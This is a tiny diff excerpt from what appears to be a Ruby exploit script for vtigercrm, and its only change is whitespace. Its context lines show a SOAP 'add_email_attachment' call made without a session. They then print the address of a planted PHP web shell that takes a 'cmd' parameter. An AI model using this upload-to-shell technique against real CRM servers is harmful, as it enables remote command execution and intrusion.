@@ -43,7 +43,7 @@ response = client.call( :add_email_attachment,
                                      username: "KING", 
                                      sessionid: nil
                                 }
-                     )
+                      )
 puts "[+] PHP Shell on:  http://#{URI.parse(url).host}/vtigercrm/soap/#{shell_name}?cmd=id"
 
 ```
